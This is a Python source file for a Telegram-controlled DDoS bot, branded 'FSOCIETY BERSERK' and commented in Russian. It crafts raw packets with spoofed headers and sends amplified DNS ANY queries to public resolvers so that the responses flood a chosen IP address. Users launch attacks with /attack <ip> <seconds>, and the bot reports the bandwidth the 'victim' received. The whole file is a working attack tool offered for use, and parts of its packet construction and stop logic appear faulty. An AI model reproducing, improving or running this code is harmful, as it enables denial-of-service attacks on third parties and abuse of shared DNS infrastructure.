#!/usr/bin/env python3
# ███████╗███████╗ ██████╗ ██████╗██╗███████╗████████╗██╗   ██╗
# ██╔════╝██╔════╝██╔═══██╗██╔════╝██║██╔════╝╚══██╔══╝╚██╗ ██╔╝
# █████╗  ███████╗██║   ██║██║     ██║███████╗   ██║    ╚████╔╝ 
# ██╔══╝  ╚════██║██║   ██║██║     ██║╚════██║   ██║     ╚██╔╝  
# ███████║███████║╚██████╔╝╚██████╗██║███████║   ██║      ██║   
# ╚══════╝╚══════╝ ╚═════╝  ╚═════╝╚═╝╚══════╝   ╚═╝      ╚═╝   
#              BERSERK ASYNC — ДЛЯ RAILWAY

import os
import sys
import time
import socket
import struct
import threading
import asyncio
import random
from datetime import datetime

# ========== ПРОВЕРКА ТОКЕНА ==========
print("\n" + "="*70)
print("🔥 FSOCIETY BERSERK — ПРОВЕРКА ТОКЕНА")
print("="*70)

BOT_TOKEN = os.getenv('BOT_TOKEN')
if not BOT_TOKEN:
    print("\n❌ ТОКЕН НЕ НАЙДЕН!")
    print("💡 В Railway добавь переменную: BOT_TOKEN = твой_токен")
    print("💡 После добавления нажми Redeploy")
    sys.exit(1)

print(f"✅ Токен найден: {BOT_TOKEN[:10]}...")

# ========== ТЕЛЕГРАМ ==========
import telebot
from telebot.types import Message

bot = telebot.TeleBot(BOT_TOKEN)

# ========== КОНФИГУРАЦИЯ ==========
ADMIN_IDS = [int(x.strip()) for x in os.getenv('ADMIN_IDS', '').split(',') if x.strip()]
authorized_users = ADMIN_IDS.copy()
active_attacks = {}

# ========== РАСЧЁТ ПОД ЖЕЛЕЗО ==========
try:
    import psutil
    CPU_CORES = os.cpu_count() or 48
    RAM_GB = psutil.virtual_memory().total / (1024**3)
except:
    CPU_CORES = 48
    RAM_GB = 384

ASYNC_WORKERS = CPU_CORES * 25000
SYNC_THREADS = CPU_CORES * 5000
BURST_SIZE = 100000
SOCKETS_PER_WORKER = 20

print(f"\n⚡ CPU: {CPU_CORES} ядер")
print(f"🧠 RAM: {RAM_GB:.1f} ГБ")
print(f"🚀 Асинхронных задач: {ASYNC_WORKERS}")

# ========== DNS СЕРВЕРЫ ==========
DNS_SERVERS = [
    '8.8.8.8', '8.8.4.4', '1.1.1.1', '1.0.0.1',
    '9.9.9.9', '149.112.112.112', '208.67.222.222', '208.67.220.220',
    '94.140.14.14', '94.140.15.15', '185.228.168.9', '185.228.169.9',
]

DNS_POOL = DNS_SERVERS * 200
random.shuffle(DNS_POOL)
print(f"🌐 DNS серверов: {len(DNS_POOL)}")

# ========== DNS QUERY ==========
def create_query(domain='example.com'):
    parts = domain.split('.')
    domain_part = b''
    for part in parts:
        domain_part += bytes([len(part)]) + part.encode()
    domain_part += b'\x00'
    
    tid = random.randint(0, 65535)
    flags = 0x0100
    questions = 1
    header = struct.pack('!HHHHHH', tid, flags, questions, 0, 0, 0)
    qtype = 255
    qclass = 1
    edns = b'\x00\x00\x29\x10\x00\x00\x00\x00\x00\x00'
    
    return header + domain_part + struct.pack('!HH', qtype, qclass) + edns

QUERY = create_query()

# ========== DNS ВОРКЕР ==========
class DNSWorker:
    def __init__(self):
        self.running = False
        self.packets = 0
        self.bytes = 0
        self.lock = threading.Lock()
    
    def worker(self, target_ip, duration):
        socks = []
        for _ in range(SOCKETS_PER_WORKER):
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1048576 * 32)
            socks.append(s)
        
        ip_hdr = struct.pack('!BBHHHBBH4s4s',
            0x45, 0, 40 + len(QUERY), 0, 0, 0, 64, 17, 0,
            socket.inet_aton('0.0.0.0'),
            socket.inet_aton(target_ip)
        )
        
        end = time.time() + duration
        local = 0
        
        while time.time() < end and self.running:
            try:
                for _ in range(BURST_SIZE):
                    sock = random.choice(socks)
                    src = random.randint(1024, 65535)
                    udp = struct.pack('!HHHH', src, 53, 8 + len(QUERY), 0)
                    dns = random.choice(DNS_POOL)
                    
                    sock.sendto(ip_hdr + udp + QUERY, (dns, 53))
                    local += 1
                    
                    if local >= 10000:
                        with self.lock:
                            self.packets += local
                            self.bytes += local * (len(ip_hdr) + len(udp) + len(QUERY))
                        local = 0
            except:
                continue
        
        if local > 0:
            with self.lock:
                self.packets += local
                self.bytes += local * (len(ip_hdr) + len(udp) + len(QUERY))
        
        for s in socks:
            s.close()
    
    def attack(self, target_ip, duration, threads=SYNC_THREADS):
        self.running = True
        self.packets = 0
        self.bytes = 0
        start = time.time()
        
        print(f"\n⚡ Атака на {target_ip} на {duration} сек")
        
        workers = []
        for i in range(threads):
            t = threading.Thread(target=self.worker, args=(target_ip, duration))
            t.daemon = True
            t.start()
            workers.append(t)
        
        while any(t.is_alive() for t in workers):
            elapsed = time.time() - start
            if elapsed > 0:
                gbps = (self.bytes * 8) / 1_000_000_000 / max(elapsed, 0.1)
                target_gbps = gbps * 70
                print(f"\r🔥 {gbps:.2f} Гбит/с | 🎯 {target_gbps:.1f} Гбит/с | ⏱ {duration - elapsed:.0f} сек", end='')
            time.sleep(1)
        
        for t in workers:
            t.join(timeout=2)
        
        elapsed = time.time() - start
        gbps = (self.bytes * 8) / 1_000_000_000 / max(elapsed, 0.1)
        
        return {
            'packets': self.packets,
            'bytes': self.bytes,
            'gbps': gbps,
            'target_gbps': gbps * 70
        }

# ========== ПРОВЕРКА ПРАВ ==========
def is_auth(user_id):
    return user_id in authorized_users

def is_admin(user_id):
    return user_id in ADMIN_IDS

# ========== КОМАНДЫ ТЕЛЕГРАМ ==========
@bot.message_handler(commands=['start'])
def cmd_start(m):
    uid = m.from_user.id
    if not is_auth(uid):
        bot.reply_to(m, "❌ ДОСТУП ЗАПРЕЩЕН")
        return
    
    text = f"""
🔥 FSOCIETY BERSERK

👤 ID: {uid}
⚡ CPU: {CPU_CORES} ядер
🚀 Потоков: {SYNC_THREADS}

/attack <ip> <сек> - атака
/stop - остановить
/status - статус
"""
    bot.reply_to(m, text)

@bot.message_handler(commands=['attack'])
def cmd_attack(m):
    if not is_auth(m.from_user.id):
        bot.reply_to(m, "❌ Доступ запрещен")
        return
    
    try:
        parts = m.text.split()
        if len(parts) < 3:
            bot.reply_to(m, "❌ /attack <ip> <сек>")
            return
        
        target_ip = parts[1]
        duration = int(parts[2])
        
        socket.inet_aton(target_ip)
        
        bot.reply_to(m, f"⚡ Атака на {target_ip} на {duration} сек")
        
        active_attacks[m.chat.id] = {'running': True}
        
        def run():
            dns = DNSWorker()
            result = dns.attack(target_ip, duration)
            
            if m.chat.id in active_attacks:
                del active_attacks[m.chat.id]
                
                bot.send_message(m.chat.id, f"""
✅ АТАКА ЗАВЕРШЕНА

📦 Пакетов: {result['packets']:,}
⚡ Твоя скорость: {result['gbps']:.2f} Гбит/с
🎯 Жертва получала: {result['target_gbps']:.1f} Гбит/с
                """)
        
        threading.Thread(target=run).start()
        
    except Exception as e:
        bot.reply_to(m, f"❌ Ошибка: {e}")

@bot.message_handler(commands=['stop'])
def cmd_stop(m):
    if not is_auth(m.from_user.id):
        return
    
    if m.chat.id in active_attacks:
        active_attacks[m.chat.id]['running'] = False
        del active_attacks[m.chat.id]
        bot.reply_to(m, "🛑 АТАКА ОСТАНОВЛЕНА")
    else:
        bot.reply_to(m, "❌ Нет активной атаки")

@bot.message_handler(commands=['status'])
def cmd_status(m):
    if not is_auth(m.from_user.id):
        return
    
    if m.chat.id in active_attacks:
        bot.reply_to(m, "⚡ АТАКА АКТИВНА")
    else:
        bot.reply_to(m, "💤 НЕТ АКТИВНЫХ АТАК")

@bot.message_handler(commands=['add'])
def cmd_add(m):
    if not is_admin(m.from_user.id):
        return
    
    try:
        uid = int(m.text.split()[1])
        if uid not in authorized_users:
            authorized_users.append(uid)
            bot.reply_to(m, f"✅ Добавлен {uid}")
    except:
        bot.reply_to(m, "❌ /add <id>")

@bot.message_handler(commands=['remove'])
def cmd_remove(m):
    if not is_admin(m.from_user.id):
        return
    
    try:
        uid = int(m.text.split()[1])
        if uid in ADMIN_IDS:
            bot.reply_to(m, "❌ Нельзя удалить админа")
        elif uid in authorized_users:
            authorized_users.remove(uid)
            bot.reply_to(m, f"✅ Удален {uid}")
    except:
        bot.reply_to(m, "❌ /remove <id>")

# ========== ЗАПУСК ==========
if __name__ == '__main__':
    print("\n" + "="*70)
    print("🔥 FSOCIETY BERSERK — 1.2M PACKETS/SEC 🔥")
    print("="*70)
    print(f"🤖 Бот: @{bot.get_me().username}")
    print(f"⚡ Потоков: {SYNC_THREADS}")
    
    try:
        import requests
        requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/deleteWebhook")
        print("✅ Вебхук удален")
    except:
        pass
    
    bot.infinity_polling()
